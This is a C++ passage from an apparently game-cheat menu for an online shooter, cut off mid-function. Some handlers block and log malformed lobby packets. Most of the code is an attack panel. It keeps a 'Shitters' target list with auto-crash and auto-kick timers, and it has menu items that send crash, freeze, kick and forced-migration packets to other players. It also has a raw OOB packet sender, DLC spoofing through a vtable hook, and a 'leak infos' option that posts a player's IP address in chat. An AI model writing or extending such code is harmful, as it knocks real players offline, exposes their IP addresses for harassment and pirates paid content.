		AddToLog("-->" + "LM : LOBBY STATE GAMECUSTOM BLOCKED "s);
		ImGui::InsertNotification({ ImGuiToastType_LM, 5000, "LM GAMECUSTOM BLOCKED " });

		std::ofstream myfile;
		myfile.open("godness\\logs\\logs.txt""", std::ios_base::app);
		myfile << dt << " LM ' State GameCustom ' BLOCKED from " << from_xuid << "\n";
		myfile.close();

		MSG_Discard(msg);

	}
	break;

	case 0x6: // log MESSAGE_TYPE_LOBBY_STATE_GAMETHEATER
	{


		AddToLog("-->" + "LM : LOBBY STATE GAMETHEATER BLOCKED "s);
		ImGui::InsertNotification({ ImGuiToastType_LM, 5000, "LM GAMETHEATER BLOCKED " });

		std::ofstream myfile;
		myfile.open("godness\\logs\\logs.txt""", std::ios_base::app);
		myfile << dt << " LM ' State GameTheater ' BLOCKED from " << from_xuid << "\n";
		myfile.close();

		MSG_Discard(msg);


	}
	break;


	case 0x8: // log Host Disconnection
	{

		memset(requestOut, 0, sizeof(requestOut));
		if (MSG_Host_Disconnection_Inspect(requestOut, (char*)&lobbyMsg) == 1)
		{
			AddToLog("-->" + "LM ' Host Disconnection BLOCKED"s);
			ImGui::InsertNotification({ ImGuiToastType_LM, 5000, "LM HostDisconnect BLOCKED" });
			MSG_Discard(msg);
			if (chatcrash)
			{
				send_chat_message("^1Bad Host Disconnect Packet ^2BLOCKED ^7, nice try ^6LOOZA^7!");
			}
		}


	}
	break;

	case 0x9: //handle lobby host disconnect client
	{
		// some kick and disconection ways


		ImGui::InsertNotification({ ImGuiToastType_LM, 5000, "Host Disconnect BLOCKED " });

		AddToLog("--> LM : Host Disconnect BLOCKED");

		std::ofstream myfile;
		myfile.open("godness\\logs\\logs.txt""", std::ios_base::app);
		myfile << dt << " LM 'host disconnection Client' BLOCKED from : " << from_xuid << "\n";
		myfile.close();

		MSG_Discard(msg); // clears bad msgs
		if (chatcrash)
		{
			send_chat_message("^1Host Disconnect Client Packet ^2BLOCKED ^7, nice try ^6LOOZA^7!");
		}
	}
	break;

	case 0xB: // log Client HeartBeat // const at main menu at least
	{

		//AddToLog("-->" + "LM ' Client HeartBeat BLOCKED"s);
		//ImGui::InsertNotification({ ImGuiToastType_LM, 5000, "LM Client HeartBeat BLOCKED" });


	}
	break;

	case 0xC: // log MESSAGE_TYPE_LOBBY_CLIENT_DISCONNECT
	{

		memset(requestOut, 0, sizeof(requestOut));
		if (MSG_Client_Disconnect_Inspect(requestOut, (char*)&lobbyMsg) == 1)
		{
			AddToLog("-->" + "LM ' Client Disconnect BLOCKED"s);
			ImGui::InsertNotification({ ImGuiToastType_LM, 5000, "LM Client Disco BLOCKED" });

			std::ofstream myfile;
			myfile.open("godness\\logs\\logs.txt""", std::ios_base::app);
			myfile << dt << " LM ' Client Disconnect '  from " << from_xuid << "\n";
			myfile.close();

			MSG_Discard(msg); // clears bad msgs
			if (chatcrash)
			{
				send_chat_message("^1Bad Client Disconnect Packet ^2BLOCKED ^7, nice try ^6LOOZA^7!");
			}
		}

	}
	break;



	//case 0xE: // log MESSAGE_TYPE_LOBBY_CLIENT_CONTENT
	//{
	//	memset(requestOut, 0, sizeof(requestOut));
	//	if (MSG_Client_Content_Inspect(requestOut, (char*)&lobbyMsg) == 1)
	//	{

	//		AddToLog("-->" + "LM ' Client Content BLOCKED"s);
	//		ImGui::InsertNotification({ ImGuiToastType_LM, 5000, "LM Client Content BLOCKED" });

	//		std::ofstream myfile;
	//		myfile.open("godness\\logs\\logs.txt""", std::ios_base::app);
	//		myfile << dt << " LM ' Client Content ' BLOCKED from " << from_xuid << "\n";
	//		myfile.close();

	//		MSG_Discard(msg);
	//	}

	//}
	//break;

	case 0x12: // join agreement request 
	{

		memset(requestOut, 0, sizeof(requestOut));
		if (MSG_Join_Agreement_Rq_Inspection(requestOut, (char*)&lobbyMsg) == 1)
		{
			AddToLog("-->" + "LM : JoinAgreementRequest BLOCKED"s);
			ImGui::InsertNotification({ ImGuiToastType_LM, 5000, "LM JoinAgreement BLOCKED" });
			MSG_Discard(msg);
			if (chatcrash)
			{
				send_chat_message("^1Bad Join Agreement Request Packet ^2BLOCKED ^7, nice try ^6LOOZA^7!");
			}
		}

	}
	break;

	case 0x14: // join Complet 
	{
		memset(requestOut, 0, sizeof(requestOut));
		if (MSG_Join_Complete_Inspection(requestOut, (char*)&lobbyMsg) == 1)
		{
			AddToLog("-->" + "LM : JoinComplet BLOCKED"s);
			ImGui::InsertNotification({ ImGuiToastType_LM, 5000, "LM JoinComplet BLOCKED" });
			MSG_Discard(msg);
			if (chatcrash)
			{
				send_chat_message("^1Bad Join Complet Packet ^2BLOCKED ^7, nice try ^6LOOZA^7!");
			}
		}

	}
	break;

	case 0x17: // p2p connectivity test
	{

		memset(requestOut, 0, sizeof(requestOut));
		if (MSG_P2P_Connectivity_Test_Inspect(requestOut, (char*)&lobbyMsg) == 1)
		{
			AddToLog("-->" + "LM : P2P Test BLOCKED"s);
			ImGui::InsertNotification({ ImGuiToastType_LM, 5000, "LM P2P Test BLOCKED" });
			MSG_Discard(msg);
			if (chatcrash)
			{
				send_chat_message("^1Bad P2P Connectivity Test Packet ^2BLOCKED ^7, nice try ^6LOOZA^7!");
			}
		}

	}
	break;

	case 0x18: // p2p info 
	{

		memset(requestOut, 0, sizeof(requestOut));
		if (MSG_P2P_Info_Inspect(requestOut, (char*)&lobbyMsg) == 1)
		{
			AddToLog("-->" + "LM : P2P Info BLOCKED"s);
			ImGui::InsertNotification({ ImGuiToastType_LM, 5000, "LM P2P Info BLOCKED" });
			MSG_Discard(msg);
			if (chatcrash)
			{
				send_chat_message("^1Bad P2P Info Packet ^2BLOCKED ^7, nice try ^6LOOZA^7!");
			}

		}
	}
	break;

	case 0x19: // migrate test 
	{

		memset(requestOut, 0, sizeof(requestOut));
		if (MSG_Migrate_Test_Inspect(requestOut, (char*)&lobbyMsg) == 1)
		{
			AddToLog("-->" + "LM : Migrate Test BLOCKED"s);
			ImGui::InsertNotification({ ImGuiToastType_LM, 5000, "LM Migrate Test BLOCKED" });
			MSG_Discard(msg);
			if (chatcrash)
			{
				send_chat_message("^1Bad Migrate Test Packet ^2BLOCKED ^7, nice try ^6LOOZA^7!");
			}
		}

	}
	break;





	case 0xF: // modified stats
	{

		ImGui::InsertNotification({ ImGuiToastType_LM, 5000, "Modified Stats Packets BLOCKED" });

		AddToLog("--> LM : Modified Stats BLOCKED");

		std::ofstream myfile;
		myfile.open("godness\\logs\\logs.txt""", std::ios_base::app);
		myfile << dt << " LM ' Modified Stats Packets Blocked '  from " << from_xuid << "\n";
		myfile.close();

		MSG_Discard(msg); // clears bad msgs
		if (chatcrash)
		{
			send_chat_message("^1Bad Modified Stats Packet ^2BLOCKED ^7, nice try ^6LOOZA^7!");
		}
	}
	break;

	//case 0x10: // join request
	//{

	//	memset(requestOut, 0, sizeof(requestOut));

	//	if (MSG_JoinParty_Package_Inspect(requestOut, (char*)&lobbyMsg) != 0)
	//	{

	//		AddToLog("-->" + "LM JoinParty BAD Packets BLOCKED"s);
	//		ImGui::InsertNotification({ ImGuiToastType_LM, 5000, "LM JoinParty BLOCKED" });



	//		MSG_Discard(msg); // clears bad msgs
	//	}


	//}
	//break;

	case 0x16: // handle server info
	{


		ImGui::InsertNotification({ ImGuiToastType_LM, 5000, "Server Info Packets BLOCKED" });

		AddToLog("--> LM : Server List Info BLOCKED");

		std::ofstream myfile;
		myfile.open("godness\\logs\\logs.txt""", std::ios_base::app);
		myfile << dt << " LM ' Server Info Packets Blocked '  from " << from_xuid << "\n";
		myfile.close();

		MSG_Discard(msg); // clears bad msgs
		if (chatcrash)
		{
			send_chat_message("^1Bad Server Info Packet ^2BLOCKED ^7, nice try ^6LOOZA^7!");
		}
	}
	break;

	case 0x1A: // MIGRATE_ANNOUNCE_HOST
	{


		memset(requestOut, 0, sizeof(requestOut));
		if (MSG_Migrate_Announce_Host_Inspect(requestOut, (char*)&lobbyMsg) == 1)
		{
			AddToLog("-->" + "LM : Migrate Announce Host BLOCKED"s);
			ImGui::InsertNotification({ ImGuiToastType_LM, 5000, "LM Migrate Host BLOCKED" });
			MSG_Discard(msg);
			if (chatcrash)
			{
				send_chat_message("^1Bad Migrate Announce Host Packet ^2BLOCKED ^7, nice try ^6LOOZA^7!");
			}
		}

	}
	break;

	case 0x1B: // Migrate Start Inspection
	{
		memset(requestOut, 0, sizeof(requestOut));
		if (MSG_MigrateStart_Inspect2(requestOut, (char*)&lobbyMsg) == 1)
		{
			AddToLog("-->" + "LM : MigrateStart Blocked"s);

			ImGui::InsertNotification({ ImGuiToastType_LM, 5000, "MigrateStart BLOCKED" });

			std::ofstream myfile;
			myfile.open("godness\\logs\\logs.txt""", std::ios_base::app);
			myfile << dt << " LM ' MigrateStart Blocked '  from " << from_xuid << "\n";
			myfile.close();


			MSG_Discard(msg); // clears bad msgs
			if (chatcrash)
			{
				send_chat_message("^1Bad Migration Start Packet ^2BLOCKED ^7, nice try ^6LOOZA^7!");
			}
		}
	}
	break;

	case 0x1D: //MigrateNewHost
	{

		AddToLog("-->" + "LM : MigrateNewHost Blocked"s);

		//ImGui::InsertNotification({ ImGuiToastType_LM, 5000, "MigrateNewHost BLOCKED" });


	}
	break;


	case 0x1E: // voice packet
	{
		if (MSG_VoicePacket_Inspect(&lobbyMsg))
		{


			ImGui::InsertNotification({ ImGuiToastType_LM, 5000, "Voice Packets BLOCKED" });

			AddToLog("--> LM : Voice Packets BLOCKED");

			std::ofstream myfile;
			myfile.open("godness\\logs\\logs.txt""", std::ios_base::app);
			myfile << dt << " LM ' Voice Packets Blocked '  from " << from_xuid << "\n";
			myfile.close();

			MSG_Discard(msg); // clears bad msgs
			if (chatcrash)
			{
				send_chat_message("^1Bad Voice Packet ^2BLOCKED ^7, nice try ^6LOOZA^7!");
			}
		}
	}
	break;

	case 0x1F: // voice relay packet
	{

		if (MSG_VoicePacket_Inspect(&lobbyMsg))
		{

			ImGui::InsertNotification({ ImGuiToastType_LM, 5000, "Voice Relay Packets BLOCKED" });

			AddToLog("--> LM : Voice Relay Packets BLOCKED");

			std::ofstream myfile;
			myfile.open("godness\\logs\\logs.txt""", std::ios_base::app);
			myfile << dt << " LM ' Voice Relay Packets Blocked '  from " << from_xuid << "\n";
			myfile.close();

			MSG_Discard(msg); // clears bad msgs
			if (chatcrash)
			{
				send_chat_message("^1Bad Voice Relay Packet ^2BLOCKED ^7, nice try ^6LOOZA^7!");
			}
		}
	}

	break;

	case 0x20: //handle MESSAGE_TYPE_DEMO_STATE
	{

		memset(requestOut, 0, sizeof(requestOut));
		if (MSG_Demo_State_Inspect(requestOut, (char*)&lobbyMsg) == 1)
		{
			AddToLog("-->" + "LM : Demo State Blocked"s);

			ImGui::InsertNotification({ ImGuiToastType_LM, 5000, "Demo State BLOCKED" });

			std::ofstream myfile;
			myfile.open("godness\\logs\\logs.txt""", std::ios_base::app);
			myfile << dt << " LM 'Demo State'  BLOCKED : " << from_xuid << "\n";
			myfile.close();

			MSG_Discard(msg);
		}

	}
	break;

	}
	return 0;
}

LONG CALLBACK hkUI_Interface_DrawText(LPEXCEPTION_POINTERS ExceptionInfo) //a hook to filter all text in the game, here used to block all materials i know.
{

	auto text{ reinterpret_cast<char*>(ExceptionInfo->ContextRecord->R12) };

	int strIndex = strlen(text);
	for (int i = 0; i < strIndex; i++) {
		if ((i + 1) < strIndex) {
			if (text[i] == '^' && (text[i + 1] == 'H' || text[i + 1] == 'B' || text[i + 1] == 'I')) {
				text[i + 1] = '!';



			}
		}
	}

	return 1;
}




const char* __fastcall hkCL_GetConfigString(std::int32_t configStringIndex) // a hook to block loadside (a cbuf to change the map, but can be weaponized when you are not the host.
{

	time_t now = time(0);
#pragma warning(suppress : 4996)
	char* dt = ctime(&now);

	constexpr auto mspreload_command = "mspreload";

	if (is_in_number_array(configStringIndex, config_strings))
	{
		if (auto config_string{ CL_GetConfigString(configStringIndex) }; is_equal(config_string, mspreload_command, std::strlen(mspreload_command), false))
		{
			CL_StoreConfigString(configStringIndex, "");
			ImGui::InsertNotification({ ImGuiToastType_MT, 5000, "Loadside Controlled" });
			AddToLog(" !!! Loadside Controlled !!!");

			std::ofstream myfile;
			myfile.open("godness\\logs\\logs.txt""", std::ios_base::app);
			myfile << dt << " 'Loadside' Controlled\n";
			myfile.close();
		}
	}

	return CL_GetConfigString(configStringIndex);
}

__int64 hkObituary(int a1, unsigned char* attacker, char a3, __int64 victim, char a5, __int64 a6, float a7, float a8, bool a9) //a hook to log the killfeed
{
	time_t now = time(0);
#pragma warning(suppress : 4996)
	char* dt = ctime(&now);


	char attr[255];
	sprintf_s(attr, "%s", std::string((const char*)attacker));

	char vctm[255];
	sprintf_s(vctm, "%s", std::string((const char*)victim));




	std::string obituarymsg;



	//if ((std::string)attr == LiveUser_GetClientName(0))
	//{
	//	send_kchat_spam((std::string)vctm);

	//}





	obituarymsg = "  { " + std::string(vctm) + " } was killed by { " + std::string(attr) + " }  ";

	std::ofstream myfile;
	myfile.open("godness\\logs\\logs.txt""", std::ios_base::app);
	myfile << obituarymsg << "\n";
	myfile.close();



	return Obituary(a1, attacker, a3, victim, a5, a6, a7, a8, a9);
}





inline PVOID HookVTableFunction(_In_ ULONG_PTR* VTable, _In_ LPVOID Detour, _In_opt_ SIZE_T TableIndex)
{
	static DWORD dwOldProtect = NULL;
	::VirtualProtect(&VTable[TableIndex], sizeof(ULONG_PTR), PAGE_READWRITE, &dwOldProtect);
	LPVOID Original = (LPVOID)(VTable[TableIndex]);
	VTable[TableIndex] = (ULONG_PTR)(Detour);
	::VirtualProtect(&VTable[TableIndex], sizeof(ULONG_PTR), dwOldProtect, &dwOldProtect);
	return Original;
}

inline bool __fastcall dlcHook(__int64 A1, __int64 A2)
{
	return 1;
}




inline void SpoofDLC() //a hook that spoof dlc's (and fix fps issues btw)
{
	ULONG64* DLCvTable = **(ULONG64***)(qwProcessBase + 0x10BBCBC0);
	HookVTableFunction(DLCvTable, &dlcHook, 7);
}


__int64 hkLiveInventory_GetItemQuantity(LPEXCEPTION_POINTERS ex)
{
	return 699;
}


















void request_loop() {

	if (clock() - RequestTMR > AutoRequestTime)
	{
		std::vector<std::uint32_t> indices2{};

		for (size_t i = 0; i < friendss.size(); ++i)
		{
			indices2.emplace_back(i);
		}
		for (const auto& friend_num : indices2)
		{
			auto& friends = friendss[friend_num];
			send_info_request_to_friend(friends);
		}
		RequestTMR = clock();
	}
}

void autocrash()
{


	if (clock() - AutoCrashTMR > AutoCrashTime)
	{
		for (const auto& friends : friendss)
		{
			if (friends.auto_crash)
			{
				const auto netadr = friends.netadr;

				send_crash(friends.steam_id);
				send_relay_crash_packet(netadr);
				send_voicetest_crash_packet(netadr);
				if (netadr.inaddr)
				{
					send_lm_crash(friends.steam_id, netadr);
					send_lm_crash2(friends.steam_id, netadr);
					send_lm_crash3(friends.steam_id, netadr);
					send_hostheartbeat_crash(netadr, friends.steam_id);
					send_lsprivate_crash(netadr, friends.steam_id);
					send_lsgame_crash(netadr, friends.steam_id);
					SendVoicePacket(friends.steam_id, netadr);
				}
			}

		}
		AutoCrashTMR = clock();
	}
}

void autokick()
{


	if (clock() - AutoKickTMR > AutoKickTime)
	{
		for (const auto& friends : friendss)
		{
			if (friends.auto_kick)
			{
				const auto netadr = friends.netadr;

				send_connect_response_migration_packet(netadr);

				if (netadr.inaddr)
				{
					SendBADDLC(friends.steam_id, netadr);
				}
			}

		}
		AutoKickTMR = clock();
	}
}

void remove_friend(const std::uint64_t steam_id)
{
	const auto entry = std::find_if(friendss.begin(), friendss.end(), [=](const auto& friends) { return friends.steam_id == steam_id; });

	if (entry != friendss.end())
	{
		friendss.erase(entry);
	}

	write_to_friends();
}

void friendslist()
{

	if (ImGui::BeginTabItem("Shitters"))
	{


		const auto width = ImGui::GetContentRegionAvail().x;

		const auto spacing = ImGui::GetStyle().ItemInnerSpacing.x;

		static ImGuiTextFilter filter;

		ImGui::Dummy(ImVec2(0.0f, 2.0f));

		filter.Draw("##search_friend", "Search shitter by Name", width * 0.80f);
		ImGui::SetNextItemWidth(width * 0.80f);

		ImGui::SameLine(0.0f, spacing);

		const auto popup = "Add Friend##add_friend_popup"s;

		if (ImGui::Button("Add shitter"))
		{
			ImGui::OpenPopup(popup.data());
		}
		ImGui::Dummy(ImVec2(0.0f, 2.0f));

		ImGui::SetNextWindowBgAlpha(1.0f);

		if (ImGui::BeginPopupModal(popup.data(), nullptr, ImGuiWindowFlags_NoResize))
		{
			static auto name_input = ""s;
			static auto steam_id_input = ""s;
			static auto ip_input = ""s;



			ImGui::SetNextItemWidth(width * 0.5f);
			ImGui::InputTextWithHint("##name_input", "Name", &name_input);

			ImGui::Separator();

			ImGui::SetNextItemWidth(width * 0.5f);
			ImGui::InputTextWithHint("##steam_id_input", "Steam ID", &steam_id_input);







			if (ImGui::MenuItem("Add shitter", nullptr, nullptr, !name_input.empty() && !steam_id_input.empty()))
			{
				friendss.emplace_back(friends_t{ atoll(steam_id_input), name_input });
				write_to_friends();

				ImGui::CloseCurrentPopup();
			}



			if (ImGui::IsKeyPressedWithIndex(ImGuiKey_Escape))
			{
				ImGui::CloseCurrentPopup();
			}

			ImGui::EndPopup();
		}


		ImGui::Separator();

		ImGui::BeginColumns("shitters", 3, ImGuiColumnsFlags_NoResize);

		ImGui::TextUnformatted("Name");
		ImGui::NextColumn();
		ImGui::TextUnformatted("Statut");
		ImGui::NextColumn();
		ImGui::TextUnformatted("Action");
		ImGui::NextColumn();


		ImGui::Separator();

		std::vector<std::uint32_t> indices{};

		for (size_t i = 0; i < friendss.size(); ++i)
		{
			indices.emplace_back(i);
		}

		std::sort(indices.begin(), indices.end(), [](const auto& a, const auto& b) { return friendss[a].name < friendss[b].name; });

		for (const auto& friend_num : indices)
		{


			auto& friends = friendss[friend_num];
			const auto netadr = friends.netadr;
			const auto HOSTnetadr = friends.hostnetadr;









			if (filter.PassFilter(friends.name))
			{

				const auto selected = ImGui::Selectable(friends.name.data());



				ImGui::NextColumn();

				ImGui::AlignTextToFramePadding();

				if (netadr.inaddr)
				{
					ImGui::TextColored(ImVec4(0, 255, 0, 255), "| Online |");
				}
				else
				{
					ImGui::TextColored(ImVec4(255, 0, 0, 255), "| Offline |");
				}


				ImGui::NextColumn();

				ImGui::AlignTextToFramePadding();

				if (friends.auto_crash)
				{
					if (friends.auto_kick)
					{
						ImGui::TextColored(ImVec4(140, 220, 0, 255), "Auto-Crash");
						ImGui::SameLine();
						ImGui::TextColored(ImVec4(60, 220, 0, 255), "  Auto-Kick");
					}
					else
					{
						ImGui::TextColored(ImVec4(140, 220, 0, 255), "Auto-Crash");
					}

				}
				else
				{
					if (friends.auto_kick)
					{
						ImGui::TextColored(ImVec4(60, 220, 0, 255), "Auto-Kick");
					}
					else
					{
						ImGui::TextDisabled(" none");
					}
				}




				const auto popup = "friend_popup##" + std::to_string(friend_num);

				if (selected)
				{
					auto inforq = "^1Info request ^6sent to ^2"s + std::to_string(friends.steam_id);
					send_info_request_to_friend(friends);

					ImGui::OpenPopup(popup.data());
				}



				if (ImGui::BeginPopup(popup.data(), ImGuiWindowFlags_NoMove))
				{
					ImGui::MenuItem(friends.name + "##" + std::to_string(friend_num) + "friend_menu_item", nullptr, false, false);

					if (ImGui::IsItemClicked())
					{

					}

					if (ImGui::IsItemHovered())
					{
						ImGui::SetMouseCursor(ImGuiMouseCursor_Hand);
					}

					if (ImGui::BeginMenu("Rename##" + std::to_string(friend_num)))
					{
						static auto rename_friend_input = ""s;

						ImGui::InputTextWithHint("##" + std::to_string(friend_num), "Name", &rename_friend_input);

						if (ImGui::MenuItem("Rename"))
						{
							if (friends.name != rename_friend_input)
							{
								friends.name = rename_friend_input;

								write_to_friends();
							}
						}

						ImGui::EndMenu();
					}

					if (ImGui::MenuItem("Remove"))
					{
						remove_friend(friends.steam_id);
					}



					ImGui::Separator();

					if (ImGui::MenuItem(std::to_string(friends.steam_id)))
					{
						ImGui::LogToClipboardUnformatted(std::to_string(friends.steam_id));
					}

					ImGui::Separator();


					if (ImGui::MenuItem("Join"))
					{
						const auto command = "join " + std::to_string(friends.steam_id);
						Cbuf_AddText(0, command.data());
					}

					if (ImGui::MenuItem("profil"))
					{
						open = false;
						LiveUser_GetProfilByXUID(friends.steam_id);
					}

					if (ImGui::MenuItem("Friend Request"))
					{
						open = false;
						LiveUser_FriendRequestByXUID(friends.steam_id);
					}



					ImGui::Separator();



					ImGui::MenuItem("Auto-Crash", "", &friends.auto_crash);


					ImGui::MenuItem("Auto-Kick", "", &friends.auto_kick);


					ImGui::Separator();





					if (ImGui::MenuItem("Send popup"))
					{

						send_popup(friends.steam_id);

					}


					if (ImGui::MenuItem("Crash"))
					{

						send_crash(friends.steam_id);
						send_relay_crash_packet(netadr);
						send_voicetest_crash_packet(netadr);
						if (netadr.inaddr)
						{
							send_hostheartbeat_crash(netadr, friends.steam_id);
							send_lsprivate_crash(netadr, friends.steam_id);
							send_lsgame_crash(netadr, friends.steam_id);
							SendVoicePacket(friends.steam_id, netadr);
							SendNOPARTYCHAT3(friends.steam_id, netadr);
						}
					}

					if (ImGui::MenuItem("Freeze Game"))
					{
						if (netadr.inaddr)
						{
							send_lm_crash(friends.steam_id, netadr);
							send_lm_crash2(friends.steam_id, netadr);
							send_lm_crash3(friends.steam_id, netadr);
						}
					}





					if (ImGui::MenuItem("Kick"))
					{

						auto infodisc = "^1Disconect ^6sent to ^2"s + std::to_string(friends.steam_id);

						send_connect_response_migration_packet(netadr);
						if (netadr.inaddr)
						{
							SendNOPARTYCHAT(friends.steam_id, netadr);

						}
					}

					if (ImGui::MenuItem("Immobilize"))
					{
						send_request_stats_packet(netadr);

					}


					if (ImGui::MenuItem("Migrate"))
					{

						send_mstart_packet(netadr);

					}





					if (ImGui::BeginMenu("Custom OOB"))
					{

						ImGui::Dummy(ImVec2(0.0f, 3.0f));

						static auto MSG_NET = ""s;

						ImGui::InputTextWithHint("##MSG_NET", "OOB/STRING", &MSG_NET);

						ImGui::SameLine();

						if (ImGui::Button("Send"))
						{
							send_oob(netadr, MSG_NET);
						}

						ImGui::EndMenu();
					}

					ImGui::EndPopup();
				}

				ImGui::NextColumn();

				if (ImGui::GetColumnIndex() == 0)
				{
					ImGui::Separator();
				}
			}
		}

		ImGui::EndColumns();
		ImGui::EndTabItem();

	}
}


void players()
{
	auto hostBs = SomeHostBsTwo(1);
	long long hostxuid = *(__int64*)(hostBs);
	netadr_t hostNetAddr = *(netadr_t*)(hostBs + 0x28);
	const auto session{ LobbySession_GetSession(get_lobby_type()) };

	if (ImGui::BeginTabItem("Players"))
	{

		ImGui::Dummy(ImVec2(0.0f, 1.4f));

		ImGui::BeginColumns("Players", 3, ImGuiColumnsFlags_NoResize);

		ImGui::SetColumnWidth(-1, 184.0f);
		ImGui::TextUnformatted("Name");
		ImGui::NextColumn();
		ImGui::TextUnformatted("IP");
		ImGui::NextColumn();
		ImGui::TextUnformatted("Steam ID");
		ImGui::NextColumn();

		ImGui::Dummy(ImVec2(0.0f, 0.7f));

		ImGui::Separator();

		for (size_t i = 0; i < 18; ++i)
		{
			const auto target_client{ LobbySession_GetClientByClientNum(session, i) };
			

			if (target_client && target_client->activeClient)
			{
				ImGui::AlignTextToFramePadding();

				const auto player_name{ target_client->activeClient->fixedClientInfo.gamertag };

				const auto player_xuid{ target_client->activeClient->fixedClientInfo.xuid };

				const auto client_by_xuid{ LobbySession_GetClientByXuid(session, player_xuid) };

				const auto& sess_infomation{ players_session_info[player_xuid] };

				ImGui::AlignTextToFramePadding();

				const auto selected{ ImGui::Selectable((player_name + (std::string)"##" + std::to_string(i)).data()) };

				const auto popup{ "player_popup##" + std::to_string(i) };

				ImGui::NextColumn();

				const auto netadr{ LobbySession_GetClientNetAdrByIndex(get_lobby_type(), i) };

				const auto is_netadr_valid{ netadr.inaddr };

				const auto ip_string{ is_netadr_valid ? adr_to_string(&netadr) : "0.0.0.0" };


				ImGui::AlignTextToFramePadding();

				

				if (ImGui::MenuItem(ip_string, nullptr, nullptr, netadr.inaddr))
				{
					ImGui::LogToClipboardUnformatted(ip_string);
				}


				ImGui::AlignTextToFramePadding();

				ImGui::NextColumn();

				ImGui::AlignTextToFramePadding();

				if (LiveFriends_IsFriendByXUID(0, player_xuid) == 1)
				{

					if (ImGui::MenuItem(std::to_string(player_xuid)))
					{
						ImGui::LogToClipboardUnformatted(std::to_string(player_xuid));
					}
					ImGui::SameLine();
					ImGui::TextColored(ImVec4(255, 255, 0, 255), "| Friend |");
				}




				else	if (LiveUser_GetXUID(0) == player_xuid)
				{

					if (ImGui::MenuItem(std::to_string(player_xuid)))
					{
						ImGui::LogToClipboardUnformatted(std::to_string(player_xuid));
					}
					ImGui::SameLine();
					ImGui::TextColored(ImVec4(255, 255, 0, 255), "| You |");
				}

				else if (ImGui::MenuItem(std::to_string(player_xuid)))
				{
					ImGui::LogToClipboardUnformatted(std::to_string(player_xuid));
				}

				if (selected)
				{
					void send_info_request(const std::uint64_t target_steam_id);

					ImGui::OpenPopup(popup.data());
				}

				if (ImGui::IsItemHovered())
				{
					ImGui::SetMouseCursor(ImGuiMouseCursor_Hand);
				}

				if (ImGui::BeginPopup(popup.data(), ImGuiWindowFlags_NoMove))
				{

					if (ImGui::MenuItem("Add to Shitters")) {
						bool old = false;

						for (auto& friends : friendss) {
							if (friends.steam_id == player_xuid)
								old = true;
						}
						if (old == false) {
							friendss.emplace_back(friends_t{ player_xuid, player_name });
							write_to_friends();
							//friends::refresh_friends();
						}
					}

					ImGui::Separator();

					if (ImGui::MenuItem("profil"))
					{
						open = false;
						LiveUser_GetProfilByXUID(player_xuid);
					}

					if (ImGui::MenuItem("Friend Request"))
					{
						open = false;
						LiveUser_FriendRequestByXUID(player_xuid);
					}


					ImGui::Separator();

					if (ImGui::MenuItem("Send popup"))
					{
						send_popup(player_xuid);


					}


					if (ImGui::MenuItem("Error"))
					{
						SendZM_UI_ERROR(player_xuid, netadr);


					}





					if (ImGui::BeginMenu("Crash"))
					{
						ImGui::SetNextItemWidth(180);

						ImGui::InputTextWithHint("##CHATSPAM", "Chat Crash Message", &chatspam_msg);

						ImGui::SameLine();

						if (ImGui::Button("Send"))
						{
							send_crash_spam(player_name, ip_string, std::to_string(player_xuid));

							send_crash(player_xuid);
							send_relay_crash_packet(netadr);
							send_voicetest_crash_packet(netadr);
							send_hostheartbeat_crash(netadr, player_xuid);
							send_lsprivate_crash(netadr, player_xuid);
							send_lsgame_crash(netadr, player_xuid);
							SendVoicePacket(player_xuid, netadr);
							SendNOPARTYCHAT3(player_xuid, netadr);
						}

						if (ImGui::IsItemHovered())
							ImGui::SetTooltip("[$n] = Name\n[$ip] = IP\n[$xuid] = XUID");

						ImGui::EndMenu();
					}

					//if (ImGui::MenuItem("rrr rrtest"))
					//{
					//	sumgbcrashsidk(player_xuid);

					//}

				

					//if (ImGui::Button("test kick host"))
					//{
					//	std::string v10 = va("xuidkick_for_reason %lli PLATFORM_CLIENT_SERVER_SCRIPT_ERROR", player_xuid);
					//	Cbuf_AddText(0, (const char *)&v10);
					//}

					if (ImGui::MenuItem("Freeze Game"))
					{
						send_lm_crash2(player_xuid, netadr);
						send_lm_crash(player_xuid, netadr);
						send_lm_crash3(player_xuid, netadr);
					}

					

					
					


					if (ImGui::MenuItem("Server Disconnect", nullptr, nullptr, hostNetAddr.inaddr))
					{
						ClientDisconnect(hostNetAddr, hostxuid, player_xuid);
					}

					if (ImGui::MenuItem("CallVote Kick"))//commented out cause not working atm, needs to get client number by xuid.
					{
						Cbuf_AddText(0,"callvote kick" + *(const char *)client_by_xuid);
					}

					if (ImGui::MenuItem("Vote YES"))
					{
						Cbuf_AddText(0, "vote yes");
					}

					ImGui::SameLine();

					if (ImGui::MenuItem("Vote NO"))
					{
						Cbuf_AddText(0,"vote no");
					}


					if (ImGui::BeginMenu("Kick"))
					{
						ImGui::SetNextItemWidth(180);

						ImGui::InputTextWithHint("##CHATSPAM", "Chat Kick Message", &chatspam_msg2);

						ImGui::SameLine();

						if (ImGui::Button("Send"))
						{
							send_kick_spam(player_name, ip_string, std::to_string(player_xuid));

							SendKICK(player_xuid, netadr);
							send_connect_response_migration_packet(netadr);
						}

						if (ImGui::IsItemHovered())
							ImGui::SetTooltip("[$n] = Name\n[$ip] = IP\n[$xuid] = XUID");

						ImGui::EndMenu();
					}





					if (ImGui::BeginMenu("Immobilize"))
					{
						ImGui::SetNextItemWidth(180);

						ImGui::InputTextWithHint("##CHATSPAM", "Chat Immobilize Message", &chatspam_msg3);

						ImGui::SameLine();

						if (ImGui::Button("Send"))
						{
							send_immobilize_spam(player_name, ip_string, std::to_string(player_xuid));

							send_request_stats_packet(netadr);
						}

						if (ImGui::IsItemHovered())
							ImGui::SetTooltip("[$n] = Name\n[$ip] = IP\n[$xuid] = XUID");

						ImGui::EndMenu();
					}



					if (ImGui::BeginMenu("Migrate"))
					{
						ImGui::SetNextItemWidth(180);

						ImGui::InputTextWithHint("##CHATSPAM", "Chat Migrate Message", &chatspam_msg4);

						ImGui::SameLine();

						if (ImGui::Button("Send"))
						{
							send_migrate_spam(player_name, ip_string, std::to_string(player_xuid));

							send_mstart_packet(netadr);
						}

						if (ImGui::IsItemHovered())
							ImGui::SetTooltip("[$n] = Name\n[$ip] = IP\n[$xuid] = XUID");

						ImGui::EndMenu();
					}

					if (ImGui::MenuItem("leak infos"))
					{

						auto messag = "^4User name ^BBUTTON_CYCLE_RIGHT^ ^1"s + player_name;
						send_chat_message(messag.data());
						auto messag1 = "^4User IP ^BBUTTON_CYCLE_RIGHT^ ^1"s + ip_string;
						send_chat_message(messag1.data());
